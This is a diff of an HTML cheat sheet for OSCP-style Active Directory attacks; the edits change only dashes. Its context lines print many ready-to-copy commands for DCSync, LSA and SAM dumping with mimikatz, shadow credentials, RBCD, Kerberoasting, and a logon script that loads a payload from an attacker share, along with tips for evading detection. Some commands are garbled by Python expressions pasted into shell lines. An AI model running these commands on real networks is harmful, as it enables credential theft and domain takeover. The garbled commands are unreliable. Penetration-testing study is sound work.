@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="BloodHound dynamic attack reference with Cypher queries, attack paths, and owned-node workflows.">
     <meta name="theme-color" content="#020408">
-<title>🩸 OSCP+ BloodHound — ULTIMATE Dynamic Cheat Sheet</title>
+<title>🩸 OSCP+ BloodHound - ULTIMATE Dynamic Cheat Sheet</title>
     <link rel="icon" type="image/svg+xml" href="favicon.svg">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -533,7 +533,7 @@ body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; back
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericAll on USER — Full Control</h3>
+    <h3 class="card-title">GenericAll on USER - Full Control</h3>
     <p class="card-desc">Complete control over target user. Reset password, add shadow credentials, set SPN for Kerberoasting, modify UAC, set logon script, or write any attribute.</p>
   </div>
 <div class="platform-tabs">
@@ -576,7 +576,7 @@ body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; back
   <div class="when-to-use" style="display:none;"><p><strong>When to use:</strong> When you only have NTLM hash (no cleartext). Use <code>--no-ldaps</code> if LDAPS cert issues. Hash format: <code>LMHASH:NTHASH</code> or just <code>NTHASH</code>.</p></div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Add SPN → Kerberoast</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Add SPN → Kerberoast</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add spn <span class="var" data-var="TARGET_USER">{TARGET_USER}</span> 'MSSQLSvc/<span class="var" data-var="DC_FQDN">{DC_FQDN}</span>:1433'
 GetUserSPNs.py -dc-ip <span class="var" data-var="DC_IP">{DC_IP}</span> -request -outputfile <span class="var" data-var="TARGET_USER">{TARGET_USER}</span>.kirb <span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span class="var" data-var="USERNAME">{USERNAME}</span>:<span class="var" data-var="PASSWORD">{PASSWORD}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button><button class="btn-explain" onclick="toggleExplain(this)"><i class="fas fa-question-circle"></i> Explain</button></div>
@@ -590,7 +590,7 @@ GetUserSPNs.py -dc-ip <span class="var" data-var="DC_IP">{DC_IP}</span> -request
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Shadow Credentials</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Shadow Credentials</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add shadowCredentials <span class="var" data-var="TARGET_USER">{TARGET_USER}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button><button class="btn-explain" onclick="toggleExplain(this)"><i class="fas fa-question-circle"></i> Explain</button></div>
   </div>
@@ -609,13 +609,13 @@ GetUserSPNs.py -dc-ip <span class="var" data-var="DC_IP">{DC_IP}</span> -request
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Set Logon Script</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Set Logon Script</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' set object <span class="var" data-var="TARGET_USER">{TARGET_USER}</span> scriptPath '\\<span class="var" data-var="ATTACKER_IP">{ATTACKER_IP}</span>\share\payload.bat'</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Set UAC DONT_REQ_PREAUTH</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Set UAC DONT_REQ_PREAUTH</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add uac -f DONT_REQ_PREAUTH <span class="var" data-var="TARGET_USER">{TARGET_USER}</span>
 GetNPUsers.py -dc-ip <span class="var" data-var="DC_IP">{DC_IP}</span> -usersfile <span class="var" data-var="TARGET_USER">{TARGET_USER}</span>.txt -format hashcat -outputfile <span class="var" data-var="TARGET_USER">{TARGET_USER}</span>.asrep <span class="var" data-var="DOMAIN">{DOMAIN}</span>/</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
@@ -652,7 +652,7 @@ Set-DomainUserPassword -Identity <span class="var" data-var="TARGET_USER">{TARGE
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">Rubeus — Kerberoast after SPN add</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">Rubeus - Kerberoast after SPN add</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre># Add SPN via PowerView, then kerberoast
 Set-DomainObject -Identity <span class="var" data-var="TARGET_USER">{TARGET_USER}</span> -Set @{serviceprincipalname='MSSQLSvc/<span class="var" data-var="DC_FQDN">{DC_FQDN}</span>:1433'} -Credential $cred
 Rubeus.exe kerberoast /user:<span class="var" data-var="TARGET_USER">{TARGET_USER}</span> /domain:<span class="var" data-var="DOMAIN">{DOMAIN}</span> /dc:<span class="var" data-var="DC_IP">{DC_IP}</span> /format:hashcat /outfile:<span class="var" data-var="TARGET_USER">{TARGET_USER}</span>.kirb</pre>
@@ -660,7 +660,7 @@ Rubeus.exe kerberoast /user:<span class="var" data-var="TARGET_USER">{TARGET_USE
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">Whisker.exe — Shadow Credentials</span><span class="tool-version">v1.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">Whisker.exe - Shadow Credentials</span><span class="tool-version">v1.0+</span></div>
   <div class="code-block"><pre>Whisker.exe add /target:<span class="var" data-var="TARGET_USER">{TARGET_USER}</span> /domain:<span class="var" data-var="DOMAIN">{DOMAIN}</span> /dc:<span class="var" data-var="DC_IP">{DC_IP}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -673,13 +673,13 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET_USER">{TARGE
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView — Set Logon Script</span><span class="tool-version">PowerSploit</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView - Set Logon Script</span><span class="tool-version">PowerSploit</span></div>
   <div class="code-block"><pre>Set-DomainObject -Identity <span class="var" data-var="TARGET_USER">{TARGET_USER}</span> -Set @{scriptpath='\\\\<span class="var" data-var="ATTACKER_IP">{ATTACKER_IP}</span>\share\\payload.bat'} -Credential $cred</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView — Set UAC DONT_REQ_PREAUTH</span><span class="tool-version">PowerSploit</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView - Set UAC DONT_REQ_PREAUTH</span><span class="tool-version">PowerSploit</span></div>
   <div class="code-block"><pre>Set-DomainObject -Identity <span class="var" data-var="TARGET_USER">{TARGET_USER}</span> -XOR @{useraccountcontrol=4194304} -Credential $cred
 Rubeus.exe asreproast /user:<span class="var" data-var="TARGET_USER">{TARGET_USER}</span> /domain:<span class="var" data-var="DOMAIN">{DOMAIN}</span> /dc:<span class="var" data-var="DC_IP">{DC_IP}</span> /format:hashcat /outfile:<span class="var" data-var="TARGET_USER">{TARGET_USER}</span>.asrep</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
@@ -687,7 +687,7 @@ Rubeus.exe asreproast /user:<span class="var" data-var="TARGET_USER">{TARGET_USE
 </div>
     </div>
 <div class="tips-box"><h5><i class="fas fa-lightbulb"></i> TIPS & OPSEC</h5><ul>
-    <li><strong>Event 4724</strong> logged on DC — password reset attempt. Use during business hours to blend in.</li>
+    <li><strong>Event 4724</strong> logged on DC - password reset attempt. Use during business hours to blend in.</li>
     <li><strong>Password policy:</strong> If complexity required, use <code>Pass1234!</code> or <code>Welcome2024!</code> (15+ chars recommended).</li>
     <li><strong>Cleanup:</strong> Document original password hash. Reset back after use if stealth required.</li>
     <li><strong>Detection:</strong> SIEM rules often alert on password resets by non-admin accounts.</li>
@@ -727,7 +727,7 @@ Rubeus.exe asreproast /user:<span class="var" data-var="TARGET_USER">{TARGET_USE
 </div>
 <div class="error-item">
   <div class="error-code">constraintViolation</div>
-  <div class="error-cause"><strong>Cause:</strong> Schema violation — check attribute format</div>
+  <div class="error-cause"><strong>Cause:</strong> Schema violation - check attribute format</div>
   <div class="error-fix"><strong>Fix:</strong> Verify attribute syntax. For UAC, use numeric values or bloodyAD shorthand flags.</div>
 </div>
 <div class="error-item">
@@ -764,7 +764,7 @@ Rubeus.exe asreproast /user:<span class="var" data-var="TARGET_USER">{TARGET_USE
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericAll on GROUP — Member Manipulation</h3>
+    <h3 class="card-title">GenericAll on GROUP - Member Manipulation</h3>
     <p class="card-desc">Add yourself or any user to the target group. If the group has privileged rights (e.g., Domain Admins, Account Operators), immediate privilege escalation.</p>
   </div>
 <div class="platform-tabs">
@@ -867,7 +867,7 @@ Rubeus.exe asreproast /user:<span class="var" data-var="TARGET_USER">{TARGET_USE
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericAll on COMPUTER — RBCD, ShadowCreds, LAPS</h3>
+    <h3 class="card-title">GenericAll on COMPUTER - RBCD, ShadowCreds, LAPS</h3>
     <p class="card-desc">Full control over a computer account. Set up RBCD, add shadow credentials, read LAPS, reset computer password, add SPN, or change UAC for unconstrained delegation.</p>
   </div>
 <div class="platform-tabs">
@@ -876,7 +876,7 @@ Rubeus.exe asreproast /user:<span class="var" data-var="TARGET_USER">{TARGET_USE
 </div>
     <div class="platform-content linux active">
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — RBCD Setup</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - RBCD Setup</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add rbcd <span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span> <span class="var" data-var="CONTROLLED_COMPUTER">{CONTROLLED_COMPUTER}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button><button class="btn-explain" onclick="toggleExplain(this)"><i class="fas fa-question-circle"></i> Explain</button></div>
   </div>
@@ -895,7 +895,7 @@ Rubeus.exe asreproast /user:<span class="var" data-var="TARGET_USER">{TARGET_USE
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Shadow Credentials</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Shadow Credentials</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add shadowCredentials <span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -907,27 +907,27 @@ Rubeus.exe asreproast /user:<span class="var" data-var="TARGET_USER">{TARGET_USE
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Reset Computer Password</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Reset Computer Password</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' set password <span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span>$ <span class="var" data-var="NEW_PASSWORD">{NEW_PASSWORD}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">nxc / secretsdump — Read LAPS + SAM</span><span class="tool-version">v1.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">nxc / secretsdump - Read LAPS + SAM</span><span class="tool-version">v1.0+</span></div>
   <div class="code-block"><pre>nxc ldap <span class="var" data-var="DC_IP">{DC_IP}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' -M laps
 secretsdump.py '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span class="var" data-var="USERNAME">{USERNAME}</span>:<span class="var" data-var="PASSWORD">{PASSWORD}</span>'@<span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span> -sam</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Add SPN to Computer</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Add SPN to Computer</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add spn <span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span>$ 'cifs/<span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span>'
 GetUserSPNs.py -dc-ip <span class="var" data-var="DC_IP">{DC_IP}</span> -request <span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span class="var" data-var="USERNAME">{USERNAME}</span>:<span class="var" data-var="PASSWORD">{PASSWORD}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Set UAC Unconstrained</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Set UAC Unconstrained</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add uac -f TRUSTED_FOR_DELEGATION <span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -954,26 +954,26 @@ samtheadmin.py '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span class=
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">Whisker.exe — Shadow Credentials</span><span class="tool-version">v1.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">Whisker.exe - Shadow Credentials</span><span class="tool-version">v1.0+</span></div>
   <div class="code-block"><pre>Whisker.exe add /target:<span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span>$ /domain:<span class="var" data-var="DOMAIN">{DOMAIN}</span> /dc:<span class="var" data-var="DC_IP">{DC_IP}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">mimikatz — Reset + Dump</span><span class="tool-version">v2.2+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">mimikatz - Reset + Dump</span><span class="tool-version">v2.2+</span></div>
   <div class="code-block"><pre>lsadump::sam /patch
 lsadump::lsa /patch</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView — Add SPN</span><span class="tool-version">PowerSploit</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView - Add SPN</span><span class="tool-version">PowerSploit</span></div>
   <div class="code-block"><pre>Set-DomainObject -Identity <span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span>$ -Set @{serviceprincipalname='cifs/<span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span>'} -Credential $cred</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">Rubeus — Set UAC Unconstrained</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">Rubeus - Set UAC Unconstrained</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>Rubeus.exe tgtdeleg /target:<span class="var" data-var="TARGET_COMPUTER">{TARGET_COMPUTER}</span>$</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -984,7 +984,7 @@ lsadump::lsa /patch</pre>
     <li><strong>Computer password reset:</strong> Breaks domain trust. Target will need rejoin or password sync reset.</li>
     <li><strong>LAPS:</strong> If LAPS is installed, GenericAll often grants read access to ms-Mcs-AdmPwd.</li>
     <li><strong>Unconstrained delegation:</strong> Very noisy. Monitor for Event 4742.</li>
-    <li><strong>Shadow Credentials on computer:</strong> Excellent OPSEC — no password change, minimal logs.</li>
+    <li><strong>Shadow Credentials on computer:</strong> Excellent OPSEC - no password change, minimal logs.</li>
 </ul></div>
 <div class="error-box"><h5><i class="fas fa-triangle-exclamation"></i> COMMON ERRORS & FIXES</h5>
 <div class="error-item">
@@ -1030,7 +1030,7 @@ lsadump::lsa /patch</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericAll on DOMAIN — DCSync, Descendant Rights</h3>
+    <h3 class="card-title">GenericAll on DOMAIN - DCSync, Descendant Rights</h3>
     <p class="card-desc">Full control over the domain object. Can DCSync, grant descendant GenericAll, link malicious GPOs, modify trust properties, or add descendant objects.</p>
   </div>
 <div class="platform-tabs">
@@ -1039,7 +1039,7 @@ lsadump::lsa /patch</pre>
 </div>
     <div class="platform-content linux active">
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">secretsdump.py — DCSync</span><span class="tool-version">v0.12+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">secretsdump.py - DCSync</span><span class="tool-version">v0.12+</span></div>
   <div class="code-block"><pre>secretsdump.py '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span class="var" data-var="USERNAME">{USERNAME}</span>:<span class="var" data-var="PASSWORD">{PASSWORD}</span>'@<span class="var" data-var="DC_IP">{DC_IP}</span> -just-dc</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -1063,7 +1063,7 @@ lsadump::lsa /patch</pre>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Grant descendant GenericAll</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Grant descendant GenericAll</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add genericAll <span class="var" data-var="DOMAIN">{DOMAIN}</span> <span class="var" data-var="USERNAME">{USERNAME}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -1075,7 +1075,7 @@ lsadump::lsa /patch</pre>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Link malicious GPO</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Link malicious GPO</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' set gplink 'DC='+','.join('DC='+p for p in <span class="var" data-var="DOMAIN">{DOMAIN}</span>.split('.'))' {<span class="var" data-var="GPO_GUID">{GPO_GUID}</span>}</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -1087,7 +1087,7 @@ lsadump::lsa /patch</pre>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Add descendant computer</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Add descendant computer</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add computer PWNED '<span class="var" data-var="NEW_PASSWORD">{NEW_PASSWORD}</span>'</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -1101,7 +1101,7 @@ lsadump::lsa /patch</pre>
     </div>
     <div class="platform-content windows">
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">mimikatz — DCSync</span><span class="tool-version">v2.2+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">mimikatz - DCSync</span><span class="tool-version">v2.2+</span></div>
   <div class="code-block"><pre>lsadump::dcsync /domain:<span class="var" data-var="DOMAIN">{DOMAIN}</span> /dc:<span class="var" data-var="DC_IP">{DC_IP}</span> /all</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -1113,7 +1113,7 @@ lsadump::lsa /patch</pre>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView — Grant GenericAll</span><span class="tool-version">PowerSploit</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView - Grant GenericAll</span><span class="tool-version">PowerSploit</span></div>
   <div class="code-block"><pre>Add-DomainObjectAcl -TargetIdentity 'DC='+','.join('DC='+p for p in <span class="var" data-var="DOMAIN">{DOMAIN}</span>.split('.'))' -PrincipalIdentity <span class="var" data-var="USERNAME">{USERNAME}</span> -Rights GenericAll -Credential $cred</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -1125,7 +1125,7 @@ lsadump::lsa /patch</pre>
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">ADModule — Link GPO</span><span class="tool-version">Microsoft Signed</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">ADModule - Link GPO</span><span class="tool-version">Microsoft Signed</span></div>
   <div class="code-block"><pre>New-GPLink -Name '<span class="var" data-var="GPO_NAME">{GPO_NAME}</span>' -Target 'DC='+','.join('DC='+p for p in <span class="var" data-var="DOMAIN">{DOMAIN}</span>.split('.'))' -Enforced Yes -Credential $cred</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -1182,7 +1182,7 @@ lsadump::lsa /patch</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericAll on CertTemplate — ESC4</h3>
+    <h3 class="card-title">GenericAll on CertTemplate - ESC4</h3>
     <p class="card-desc">Modify certificate template properties to create an ESC1 vulnerability (e.g., enable client supply subject, remove manager approval, add auth EKU).</p>
   </div>
 <div class="platform-tabs">
@@ -1268,7 +1268,7 @@ ldapmodify -x -H ldap://<span class="var" data-var="DC_IP">{DC_IP}</span> -D '<s
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericWrite on USER — Targeted Attribute Abuse</h3>
+    <h3 class="card-title">GenericWrite on USER - Targeted Attribute Abuse</h3>
     <p class="card-desc">Write specific attributes on a user. Set SPN, msDS-KeyCredentialLink (Shadow Creds), scriptPath, UAC flags, unixUserPassword, mail, or manager.</p>
   </div>
 <div class="platform-tabs">
@@ -1328,8 +1328,8 @@ ldapmodify -x -H ldap://<span class="var" data-var="DC_IP">{DC_IP}</span> -D '<s
 </div>
     </div>
 <div class="tips-box"><h5><i class="fas fa-lightbulb"></i> TIPS & OPSEC</h5><ul>
-    <li><strong>GenericWrite vs GenericAll:</strong> GenericWrite is more targeted — only specific attributes, not full control.</li>
-    <li><strong>Shadow Credentials:</strong> Best OPSEC option — no password change, minimal event noise.</li>
+    <li><strong>GenericWrite vs GenericAll:</strong> GenericWrite is more targeted - only specific attributes, not full control.</li>
+    <li><strong>Shadow Credentials:</strong> Best OPSEC option - no password change, minimal event noise.</li>
     <li><strong>SPN addition:</strong> May trigger Event 4742. Remove SPN after Kerberoasting.</li>
